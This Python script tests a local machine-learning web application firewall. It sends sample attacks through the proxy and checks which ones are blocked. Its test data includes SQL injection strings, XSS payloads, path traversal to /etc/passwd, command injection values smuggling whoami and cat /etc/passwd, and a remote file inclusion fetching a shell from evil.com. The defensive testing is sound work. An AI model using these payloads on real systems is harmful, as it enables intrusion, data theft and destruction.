#!/usr/bin/env python3
"""
Comprehensive WAF Malicious Request Testing Script
Tests various attack patterns to verify WAF protection
"""

import requests
import time
import threading
from ml_waf import MLWAFProxy

class WAFMaliciousTester:
    def __init__(self):
        self.proxy_url = "http://127.0.0.1:8085"
        self.backend_url = "http://127.0.0.1:8086"
        self.proxies = {
            'http': self.proxy_url,
            'https': self.proxy_url
        }
        self.results = []
        
    def start_proxy(self):
        """Start the WAF proxy"""
        print("Starting WAF Proxy...")
        proxy = MLWAFProxy()
        proxy_thread = threading.Thread(target=proxy.start, daemon=True)
        proxy_thread.start()
        time.sleep(3)  # Wait for proxy to start
        print("✅ WAF Proxy started on port 8085")
        return proxy
    
    def test_request(self, name, method, url, data=None, headers=None, expected_block=True):
        """Test a single request and record results"""
        print(f"\n🧪 Testing: {name}")
        print(f"   Method: {method}")
        print(f"   URL: {url}")
        if data:
            print(f"   Data: {str(data)[:50]}...")
        
        try:
            # Make request through proxy
            if method.upper() == 'GET':
                response = requests.get(url, proxies=self.proxies, headers=headers, timeout=10, verify=False)
            elif method.upper() == 'POST':
                response = requests.post(url, data=data, proxies=self.proxies, headers=headers, timeout=10, verify=False)
            else:
                response = requests.request(method, url, data=data, proxies=self.proxies, headers=headers, timeout=10, verify=False)
            
            # Analyze response
            if response.status_code == 403:
                actual_block = True
                result = "🚫 BLOCKED"
                status = "✅ PASS" if expected_block else "❌ FAIL"
            elif response.status_code == 200:
                actual_block = False
                result = "✅ ALLOWED"
                status = "✅ PASS" if not expected_block else "❌ FAIL"
            else:
                actual_block = None
                result = f"🤔 {response.status_code}"
                status = "⚠️  UNKNOWN"
            
            print(f"   Result: {result}")
            print(f"   Status: {status}")
            
            # Record result
            self.results.append({
                'name': name,
                'method': method,
                'url': url,
                'data': str(data)[:100] if data else '',
                'expected_block': expected_block,
                'actual_block': actual_block,
                'status_code': response.status_code,
                'passed': (actual_block == expected_block) if actual_block is not None else False
            })
            
        except requests.exceptions.RequestException as e:
            if "403" in str(e) or "Forbidden" in str(e):
                actual_block = True
                result = "🚫 BLOCKED (Connection refused)"
                status = "✅ PASS" if expected_block else "❌ FAIL"
            else:
                actual_block = None
                result = f"❌ ERROR: {str(e)[:50]}"
                status = "❌ ERROR"
            
            print(f"   Result: {result}")
            print(f"   Status: {status}")
            
            self.results.append({
                'name': name,
                'method': method,
                'url': url,
                'data': str(data)[:100] if data else '',
                'expected_block': expected_block,
                'actual_block': actual_block,
                'status_code': 403 if actual_block else None,
                'passed': (actual_block == expected_block) if actual_block is not None else False
            })
    
    def run_malicious_tests(self):
        """Run comprehensive malicious request tests"""
        
        print("\n" + "="*60)
        print("🔒 WAF MALICIOUS REQUEST TESTING")
        print("="*60)
        
        # Start proxy
        proxy = self.start_proxy()
        
        # Test categories
        test_categories = [
            {
                'name': 'SQL Injection Attacks',
                'tests': [
                    ('SQL Injection - Classic', 'POST', f'{self.backend_url}/login', 
                     "username=admin'; DROP TABLE users; --"),
                    ('SQL Injection - Union', 'POST', f'{self.backend_url}/search', 
                     "id=1' UNION SELECT password FROM users--"),
                    ('SQL Injection - Boolean', 'GET', f'{self.backend_url}/user?id=1\' OR \'1\'=\'1'),
                    ('SQL Injection - Time-based', 'POST', f'{self.backend_url}/delay', 
                     "delay=10'; WAITFOR DELAY '00:00:10'--"),
                ]
            },
            {
                'name': 'Cross-Site Scripting (XSS)',
                'tests': [
                    ('XSS - Script Tag', 'GET', f'{self.backend_url}/search?q=<script>alert(1)</script>'),
                    ('XSS - Event Handler', 'GET', f'{self.backend_url}/search?q=<img src=x onerror=alert(1)>'),
                    ('XSS - JavaScript', 'GET', f'{self.backend_url}/search?q=javascript:alert(1)'),
                    ('XSS - SVG', 'GET', f'{self.backend_url}/search?q=<svg onload=alert(1)>'),
                ]
            },
            {
                'name': 'Path Traversal',
                'tests': [
                    ('Path Traversal - Basic', 'GET', f'{self.backend_url}/file?path=../../../etc/passwd'),
                    ('Path Traversal - Windows', 'GET', f'{self.backend_url}/file?path=..\\..\\..\\windows\\system32\\drivers\\etc\\hosts'),
                    ('Path Traversal - URL Encoded', 'GET', f'{self.backend_url}/file?path=..%2F..%2F..%2Fetc%2Fpasswd'),
                    ('Path Traversal - POST', 'POST', f'{self.backend_url}/upload', 'file=../../../etc/passwd'),
                ]
            },
            {
                'name': 'Command Injection',
                'tests': [
                    ('Command Injection - Pipe', 'GET', f'{self.backend_url}/ping?host=127.0.0.1|whoami'),
                    ('Command Injection - Semicolon', 'GET', f'{self.backend_url}/cmd?command=ls;whoami'),
                    ('Command Injection - Backticks', 'GET', f'{self.backend_url}/exec?cmd=`whoami`'),
                    ('Command Injection - POST', 'POST', f'{self.backend_url}/run', 'command=cat /etc/passwd'),
                ]
            },
            {
                'name': 'File Inclusion',
                'tests': [
                    ('LFI - Direct', 'GET', f'{self.backend_url}/include?page=../../../etc/passwd'),
                    ('LFI - Filter', 'GET', f'{self.backend_url}/include?page=php://filter/read=convert.base64-encode/resource=config'),
                    ('RFI - HTTP', 'GET', f'{self.backend_url}/include?page=http://evil.com/shell.txt'),
                    ('LFI - Data', 'GET', f'{self.backend_url}/include?page=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg=='),
                ]
            },
            {
                'name': 'Legitimate Requests (Should Pass)',
                'tests': [
                    ('Normal GET', 'GET', f'{self.backend_url}/'),
                    ('Normal POST', 'POST', f'{self.backend_url}/contact', 'name=John&email=test@example.com'),
                    ('CSS File', 'GET', f'{self.backend_url}/style.css'),
                    ('JavaScript File', 'GET', f'{self.backend_url}/app.js'),
                    ('API Endpoint', 'GET', f'{self.backend_url}/api/users'),
                    ('Search Query', 'GET', f'{self.backend_url}/search?q=hello world'),
                ]
            }
        ]
        
        # Run all tests
        for category in test_categories:
            print(f"\n📂 {category['name']}")
            print("-" * 50)
            
            for test_data in category['tests']:
                if len(test_data) == 4:
                    test_name, method, url, data = test_data
                else:
                    test_name, method, url = test_data
                    data = None
                # Determine if this should be blocked
                if 'Legitimate' in category['name']:
                    expected_block = False
                else:
                    expected_block = True
                
                self.test_request(test_name, method, url, data, expected_block=expected_block)
                time.sleep(0.5)  # Small delay between requests
        
        # Print summary
        self.print_summary()
    
    def print_summary(self):
        """Print test results summary"""
        print("\n" + "="*60)
        print("📊 TEST RESULTS SUMMARY")
        print("="*60)
        
        total_tests = len(self.results)
        passed_tests = sum(1 for r in self.results if r['passed'])
        failed_tests = total_tests - passed_tests
        
        print(f"Total Tests: {total_tests}")
        print(f"✅ Passed: {passed_tests}")
        print(f"❌ Failed: {failed_tests}")
        print(f"📈 Success Rate: {(passed_tests/total_tests)*100:.1f}%")
        
        # Show failed tests
        failed_results = [r for r in self.results if not r['passed']]
        if failed_results:
            print(f"\n❌ FAILED TESTS:")
            print("-" * 50)
            for result in failed_results:
                print(f"• {result['name']}")
                print(f"  Expected: {'BLOCKED' if result['expected_block'] else 'ALLOWED'}")
                print(f"  Got: {'BLOCKED' if result['actual_block'] else 'ALLOWED' if result['actual_block'] is not None else 'ERROR'}")
                print(f"  Status Code: {result['status_code']}")
                print()
        
        # Show blocked vs allowed breakdown
        blocked_count = sum(1 for r in self.results if r['actual_block'] == True)
        allowed_count = sum(1 for r in self.results if r['actual_block'] == False)
        
        print(f"🚫 Requests Blocked: {blocked_count}")
        print(f"✅ Requests Allowed: {allowed_count}")
        
        print("\n" + "="*60)
        print("🔍 WAF PROTECTION ANALYSIS")
        print("="*60)
        
        if blocked_count > 0:
            print("✅ WAF is actively blocking malicious requests")
        else:
            print("❌ WAF is not blocking any requests - check configuration")
            
        if allowed_count > 0:
            print("✅ WAF is allowing legitimate requests")
        else:
            print("⚠️  WAF may be blocking legitimate requests - review false positives")

if __name__ == "__main__":
    tester = WAFMaliciousTester()
    tester.run_malicious_tests()
